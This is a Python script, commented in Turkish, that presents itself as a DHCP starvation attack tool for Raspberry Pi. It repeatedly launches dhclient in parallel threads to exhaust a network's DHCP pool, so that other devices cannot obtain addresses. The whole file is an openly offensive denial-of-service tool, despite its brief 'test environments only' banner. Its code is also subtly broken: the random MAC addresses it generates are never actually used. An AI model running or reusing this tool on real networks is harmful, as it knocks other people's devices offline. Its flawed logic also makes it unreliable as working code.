#!/usr/bin/env python3
import subprocess
import time
import random
import string
import threading
import os
from concurrent.futures import ThreadPoolExecutor

def generate_mac():
    """Rastgele MAC adresi oluştur"""
    mac = [0x00, 0x16, 0x3e,
           random.randint(0x00, 0xff),
           random.randint(0x00, 0xff),
           random.randint(0x00, 0xff)]
    return ':'.join(map(lambda x: "%02x" % x, mac))

def kill_dhcp_clients(iface):
    """Mevcut DHCP client'ları durdur"""
    try:
        subprocess.run(f"sudo killall dhclient 2>/dev/null", shell=True, timeout=2)
        subprocess.run(f"sudo ip addr flush dev {iface} 2>/dev/null", shell=True, timeout=2)
        time.sleep(1)
    except:
        pass

def dhcp_starve_optimized(iface, count=None):
    """Optimized DHCP Starvation - DietPi/RaspberryPi için"""
    
    print(f"[*] DHCP Starvation başlatılıyor: {iface}")
    print(f"[*] Ctrl+C ile durdurun\n")
    
    # Mevcut DHCP client'ları durdur
    kill_dhcp_clients(iface)
    
    attempt = 0
    success = 0
    failed = 0
    
    def send_dhcp_request(attempt_num):
        """Tek bir DHCP isteği gönder"""
        mac = generate_mac()
        
        cmd = [
            "sudo", "dhclient",
            "-v",
            "-4",
            "-1",
            "-cf", "/dev/null",
            "-pf", f"/var/run/dhclient.{iface}.pid.{attempt_num}",
            "-lf", f"/var/lib/dhcp/dhclient.{iface}.leases.{attempt_num}",
            iface
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=0.3)
            output = result.stderr + result.stdout
            
            if "DHCPACK" in output or "bound to" in output:
                return (True, attempt_num, mac)
            else:
                return (False, attempt_num, mac)
        except:
            return (False, attempt_num, mac)
    
    try:
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            
            while True:
                attempt += 1
                future = executor.submit(send_dhcp_request, attempt)
                futures.append(future)
                
                # Sonuçları topla
                done_futures = [f for f in futures if f.done()]
                for future in done_futures:
                    try:
                        is_success, att_num, mac = future.result(timeout=0.1)
                        if is_success:
                            success += 1
                            print(f"[+] Başarılı: {success}")
                        else:
                            failed += 1
                        futures.remove(future)
                    except:
                        pass
                
                if count and attempt >= count:
                    break
                    
    except KeyboardInterrupt:
        print(f"\n[!] Durduruldu")
        print(f"[*] Toplam: {attempt}, Başarılı: {success}, Başarısız: {failed}")
        subprocess.run(f"sudo killall dhclient 2>/dev/null", shell=True)

def main():
    import sys
    
    if len(sys.argv) > 1:
        iface = sys.argv[1]
    else:
        iface = "wlan0"
    
    if len(sys.argv) > 2:
        try:
            count = int(sys.argv[2])
        except:
            count = None
    else:
        count = None
    
    print("="*60)
    print("DHCP STARVATION ATTACK - DietPi/RaspberryPi")
    print("="*60)
    print(f"Interface: {iface}")
    print(f"Count: {count if count else 'Sınırsız'}\n")
    
    print("[!] ÖNEMLİ NOTLAR:")
    print("    - Bu araç DHCP pool'u tüketir")
    print("    - Ağdaki diğer cihazlar IP alamayacak")
    print("    - Sadece test ortamlarında kullan")
    print("    - Sudo yetkisi gerekli\n")
    
    input("Devam etmek için Enter tuşuna basın...")
    
    dhcp_starve_optimized(iface, count)

if __name__ == "__main__":
    main()